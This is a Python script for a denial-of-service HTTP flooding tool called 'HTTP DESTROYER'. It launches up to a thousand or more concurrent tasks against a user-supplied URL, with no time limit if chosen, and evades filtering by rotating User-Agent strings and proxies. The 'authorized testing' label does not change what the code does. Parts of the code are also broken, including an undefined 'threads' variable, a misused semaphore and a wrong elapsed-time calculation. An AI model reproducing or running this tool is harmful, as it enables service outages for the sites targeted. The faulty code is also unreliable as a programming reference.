import asyncio
import random
import time
import urllib.parse
import json
import string
import socket
import ipaddress
import psutil
import aiohttp
from typing import Optional, Dict, List
from rich.align import Align
from rich.console import Console, Group
from rich.layout import Layout
from rich.live import Live
from rich.markdown import Markdown
from rich.panel import Panel
from rich.progress import (
    BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
)
from rich.prompt import Prompt
from rich.rule import Rule
from rich.spinner import Spinner
from rich.table import Table
from rich.text import Text
from rich.theme import Theme

# Setup console with custom theme
custom_theme = Theme({
    "header": "bold cyan",
    "info": "dim cyan",
    "success": "green",
    "error": "bold red",
    "warning": "yellow",
    "highlight": "bold magenta",
    "input": "bold bright_blue",
    "footer": "dim",
})
console = Console(theme=custom_theme)

# User-Agents list (full list here)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
	"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
	"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
	"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
	"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
	"More Internet Explorer 9.0 user agents strings -->>",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; msn OptimizedIE8;ZHCN)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E) chromeframe/8.0.552.224",
]

# Intro markdown
INTRO_MD = """
# 🚀 HTTP DESTROYER - OPTIMIZED FLOODER
...
"""  # Insert your intro text here

# Helper for animated typing
async def type_out(text: str, delay: float = 0.0025):
    for char in text:
        console.print(char, end="", style="info", soft_wrap=True, highlight=False)
        await asyncio.sleep(delay)
    console.print()

async def splash_intro():
    console.clear()
    await type_out("\n\n", 0.01)
    title = Text("🔥 HTTP DESTROYER 🔥", style="header", justify="center")
    subtitle = Text("Optimized HTTP Flooding Tool for Authorized Testing", style="highlight", justify="center")
    console.print(title)
    console.print(subtitle)
    console.print(Rule(style="bright_magenta"))
    md = Markdown(INTRO_MD)
    console.print(md)
    console.print(Rule(style="bright_magenta"))
    console.print("\nPress [bold green]ENTER[/bold green] to start configuration...")
    await asyncio.to_thread(input)

async def check_proxy(proxy: str) -> bool:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=5) as response:
                return response.status == 200
    except:
        return False

def generate_random_payload(size: int) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

async def get_user_input() -> dict:
    # Collect inputs with validation and default fallback
    def prompt_int(prompt_text, default):
        try:
            return int(Prompt.ask(prompt_text, default=str(default)))
        except:
            return default

    def prompt_float(prompt_text, default):
        try:
            return float(Prompt.ask(prompt_text, default=str(default)))
        except:
            return default

    target_url = Prompt.ask("Enter target URL", default="http://example.com")
    method = Prompt.ask("Enter HTTP method (GET/POST)", default="GET").upper()
    post_data = None
    if method == "POST":
        post_data = Prompt.ask("Enter POST data (leave blank for random payload)", default="").strip()
        if not post_data:
            post_data = generate_random_payload(200)

    content_type = Prompt.ask("Content-Type (application/json/text/plain/none)", default="application/json")
    if content_type.lower() == "none":
        content_type = None

    dc = prompt_int("Number of threads", 1000)
    duration = prompt_int("Test duration in seconds (0 for infinite)", 60)
    request_delay = prompt_float("Request delay between requests (seconds)", 0.01)
    adaptive_rate = Prompt.ask("Enable adaptive rate? (y/n)", default="n").lower() == 'y'
    proxy_chain = Prompt.ask("Use proxy chain? (y/n)", default="n").lower() == 'y'
    whitelist_input = Prompt.ask("IP whitelist (comma separated, leave blank for none)", default="")
    blacklist_input = Prompt.ask("IP blacklist (comma separated, leave blank for none)", default="")
    export_log = Prompt.ask("Export report? (y/n)", default="n").lower() == 'y'
    log_file = Prompt.ask("Log file name", default="report.txt")

    def parse_ip_list(ip_str):
        ip_list = []
        for part in ip_str.split(','):
            part = part.strip()
            if part:
                try:
                    ip_list.append(ipaddress.ip_network(part))
                except:
                    continue
        return ip_list

    whitelist = parse_ip_list(whitelist_input)
    blacklist = parse_ip_list(blacklist_input)

    return {
        "target_url": target_url,
        "method": method,
        "post_data": post_data,
        "content_type": content_type,
        "threads": threads,
        "duration": duration,
        "request_delay": request_delay,
        "adaptive_rate": adaptive_rate,
        "proxy_chain": proxy_chain,
        "whitelist": whitelist,
        "blacklist": blacklist,
        "export_log": export_log,
        "log_file": log_file
    }

def is_ip_allowed(ip_str: str, whitelist: List[ipaddress.IPv4Network], blacklist: List[ipaddress.IPv4Network]) -> bool:
    ip_obj = ipaddress.ip_address(ip_str)
    if whitelist and not any(ip_obj in net for net in whitelist):
        return False
    if blacklist and any(ip_obj in net for net in blacklist):
        return False
    return True

class TokenBucket:
    def __init__(self, rate: float):
        self.rate = rate
        self.tokens = rate
        self.timestamp = time.monotonic()

    def acquire(self) -> bool:
        now = time.monotonic()
        elapsed = now - self.timestamp
        self.tokens += elapsed * self.rate
        if self.tokens > self.rate:
            self.tokens = self.rate
        self.timestamp = now
        if self.tokens >= 1:
            self.tokens -= 1
            return True
        return False

async def attacker_task(
    target_url: str,
    method: str,
    data: Optional[str],
    content_type: Optional[str],
    session: aiohttp.ClientSession,
    stats: dict,
    error_counts: dict,
    proxies: List[str],
    proxy_chain: bool,
    stop_event: asyncio.Event,
    logs: List[str],
    request_delay: float,
    adaptive_rate: bool,
    whitelist: List[ipaddress.IPv4Network],
    blacklist: List[ipaddress.IPv4Network],
    max_rps: float,
    semaphore: asyncio.Semaphore,
):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    current_delay = request_delay
    response_times = []

    retry_count = 0
    max_retries = 3

    while not stop_event.is_set():
        # Check IP whitelist/blacklist
        try:
            hostname = urllib.parse.urlparse(target_url).hostname
            target_ip = socket.gethostbyname(hostname)
            if not is_ip_allowed(target_ip, whitelist, blacklist):
                await asyncio.sleep(current_delay)
                continue
        except:
            pass

        # Proxy selection
        proxy = None
        if proxies:
            if proxy_chain and len(proxies) > 1:
                proxy = random.choice(proxies)
            else:
                proxy = random.choice(proxies)

        # Payload generation
        payload = data
        if method in ["POST", "MIXED"] and content_type == "text/plain":
            payload_size = random.randint(100, 1000)
            payload = generate_random_payload(payload_size)

        # Use random method if MIXED
        current_method = method if method != "MIXED" else random.choice(["GET", "POST"])

        # RPS control
        if max_rps:
            while not semaphore.acquire():
                await asyncio.sleep(0.01)

        # Send request
        try:
            start_time = time.time()
            async with session.request(
                current_method,
                target_url,
                headers=headers,
                json=payload if content_type == "application/json" else None,
                data=payload if content_type != "application/json" else None,
                proxy=proxy,
                timeout=10
            ) as resp:
                response_time = time.time() - start_time
                if len(response_times) > 50:
                    response_times.pop(0)
                response_times.append(response_time)

                if resp.status < 400:
                    stats["success"] += 1
                    logs.append(f"[success]#{stats['total'] + 1} ({resp.status}) {current_method} succeeded")
                    retry_count = 0
                else:
                    stats["fail"] += 1
                    error_counts[f"Status {resp.status}"] = error_counts.get(f"Status {resp.status}", 0) + 1
                    logs.append(f"[error]#{stats['total'] + 1} ({resp.status}) {current_method} failed")
                    retry_count += 1
        except Exception as e:
            error_type = type(e).__name__
            stats["fail"] += 1
            error_counts[error_type] = error_counts.get(error_type, 0) + 1
            logs.append(f"[error]#{stats['total'] + 1} ({error_type}) {current_method} exception")
            retry_count += 1

        # Adaptive rate adjustment
        if adaptive_rate and response_times:
            avg_response = sum(response_times) / len(response_times)
            if avg_response > 1.0:
                current_delay = min(current_delay * 1.5, 0.5)
            elif avg_response < 0.2:
                current_delay = max(current_delay / 1.5, 0.001)

        stats["total"] += 1

        # Retry with backoff
        if retry_count >= max_retries:
            logs.append(f"[warning]#{stats['total']} failed {max_retries} times, skipping")
            retry_count = 0
        elif retry_count > 0:
            backoff = (2 ** retry_count) * 0.1
            await asyncio.sleep(backoff)

        # Rotate User-Agent
        headers["User-Agent"] = random.choice(USER_AGENTS)
        await asyncio.sleep(current_delay)

async def update_live_panel(
    stats: dict,
    error_counts: dict,
    logs: List[str],
    stop_event: asyncio.Event,
    current_delay: float
):
    with Live(console=console, refresh_per_second=12) as live:
        start_time = time.time()
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            rps = stats["total"] / elapsed if elapsed > 0 else 0
            stats_table = Table.grid(expand=True)
            stats_table.add_column()
            stats_table.add_row(f"[success]✔ Success:[/success] {stats['success']}  [error]✘ Fail:[/error] {stats['fail']}")
            stats_table.add_row(f"[highlight]Requests sent:[/highlight] {stats['total']}")
            stats_table.add_row(f"[highlight]Req/sec:[/highlight] {rps:.1f}")
            stats_table.add_row(f"[highlight]Current delay:[/highlight] {current_delay:.3f}s")
            error_table = Table.grid(expand=True)
            for err, count in error_counts.items():
                error_table.add_row(f"[error]{err}:[/error] {count}")
            logs_text = "\n".join(logs[-10:])
            logs_panel = Panel(logs_text, title="[bold]Logs[/bold]", border_style="green")
            perf_table = Table.grid(expand=True)
            perf_table.add_row(f"[yellow]CPU: {psutil.cpu_percent():.1f}%[/yellow]")
            perf_table.add_row(f"[yellow]Mem: {psutil.virtual_memory().percent:.1f}%[/yellow]")
            net_bytes = psutil.net_io_counters().bytes_sent / (1024 * 1024)
            perf_table.add_row(f"[yellow]Net Sent: {net_bytes:.2f}MB[/yellow]")
            layout = Group(
                Panel(stats_table, title="[bold green]Stats[/bold green]"),
                Panel(error_table, title="[bold red]Errors[/bold red]"),
                logs_panel,
                Panel(perf_table, title="[bold yellow]System[/bold yellow]"),
            )
            live.update(layout)
            await asyncio.sleep(0.15)

async def final_report(
    stats: dict,
    error_counts: dict,
    elapsed: float,
    logs: List[str],
    export_log: bool,
    log_file: str
):
    console.clear()
    console.print(Rule("[bold cyan]Attack Summary[/bold cyan]"))
    table = Table(title="HTTP DESTROYER REPORT")
    table.add_column("Metric", style="highlight")
    table.add_column("Value", justify="right")
    table.add_row("Total Requests", str(stats["total"]))
    table.add_row("Success", str(stats["success"]))
    table.add_row("Failures", str(stats["fail"]))
    table.add_row("Elapsed Time", f"{elapsed:.2f}s")
    rps = stats["total"] / elapsed if elapsed > 0 else 0
    table.add_row("Requests/sec", f"{rps:.1f}")
    bandwidth = stats["total"] * 500 / (1024 * 1024)
    table.add_row("Bandwidth MB", f"{bandwidth:.2f}")
    console.print(table)

    error_table = Table(title="Error Breakdown")
    error_table.add_column("Error", style="error")
    error_table.add_column("Count", style="info", justify="right")
    for err, count in error_counts.items():
        error_table.add_row(err, str(count))
    console.print(error_table)

    console.print(Rule("[bright_magenta]"))
    console.print("[bold green]Thank you for using HTTP DESTROYER![/bold green]")
    console.print("[dim]Always use responsibly![/dim]")
    if export_log:
        await export_report(stats, error_counts, elapsed, logs, log_file)
        console.print(f"[success]Report saved to {log_file}[/success]")
    await asyncio.sleep(5)

async def export_report(
    stats: dict,
    error_counts: dict,
    elapsed: float,
    logs: List[str],
    filename: str
):
    try:
        with open(filename, "w") as f:
            f.write("HTTP DESTROYER - REPORT\n")
            f.write("="*50+"\n\n")
            f.write(f"Total Requests: {stats['total']}\n")
            f.write(f"Success: {stats['success']}\n")
            f.write(f"Failures: {stats['fail']}\n")
            f.write(f"Elapsed Time: {elapsed:.2f}s\n")
            rps = stats["total"] / elapsed if elapsed > 0 else 0
            f.write(f"Requests/sec: {rps:.1f}\n")
            bandwidth = stats["total"] * 500 / (1024*1024)
            f.write(f"Bandwidth (MB): {bandwidth:.2f}\n\n")
            f.write("Error Breakdown:\n")
            for err, count in error_counts.items():
                f.write(f"{err}: {count}\n")
            f.write("\nLogs:\n")
            for log in logs[-50:]:
                f.write(f"{log}\n")
            f.write("="*50+"\n")
            f.write("Generated by HTTP DESTROYER\n")
    except Exception as e:
        console.print(f"[error]Failed to export report: {e}[/error]")

async def main():
    await splash_intro()
    inputs = await get_user_input()
    if not inputs:
        console.print("[red]Error: Failed to retrieve user input.[/red]")
        return

    # Initialize stats
    stats = {"total": 0, "success": 0, "fail": 0}
    error_counts = {}
    logs = []
    stop_event = asyncio.Event()

    # RPS limit
    max_rps = 1000 if not inputs["adaptive_rate"] else 100
    semaphore = asyncio.Semaphore(1000)

    # Load proxies if needed
    proxies = []  # Add proxy list loading here if required

    # Create aiohttp session
    async with aiohttp.ClientSession() as session:
        attack_tasks = [
            asyncio.create_task(
                attacker_task(
                    target_url=inputs["target_url"],
                    method=inputs["method"],
                    data=inputs["post_data"],
                    content_type=inputs["content_type"],
                    session=session,
                    stats=stats,
                    error_counts=error_counts,
                    proxies=proxies,
                    proxy_chain=inputs["proxy_chain"],
                    stop_event=stop_event,
                    logs=logs,
                    request_delay=inputs["request_delay"],
                    adaptive_rate=inputs["adaptive_rate"],
                    whitelist=inputs["whitelist"],
                    blacklist=inputs["blacklist"],
                    max_rps=max_rps,
                    semaphore=semaphore
                )
            )
            for _ in range(inputs["threads"])
        ]

        # Live stats
        live_task = asyncio.create_task(update_live_panel(
            stats, error_counts, logs, stop_event, inputs["request_delay"]
        ))

        # Run attack for specified duration
        try:
            if inputs["duration"] > 0:
                await asyncio.sleep(inputs["duration"])
                stop_event.set()
            else:
                await asyncio.gather(*attack_tasks)
        except KeyboardInterrupt:
            console.print("[yellow]Interrupted! Stopping...[/yellow]")
            stop_event.set()

        end_time = time.time()
        elapsed = max(0.1, end_time - (time.time() - inputs["duration"]))

        # Await tasks completion
        await asyncio.gather(*attack_tasks)
        await live_task

    # Final report
    await final_report(stats, error_counts, elapsed, logs, inputs["export_log"], inputs["log_file"])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        console.print(f"[error]Fatal Error: {e}[/error]")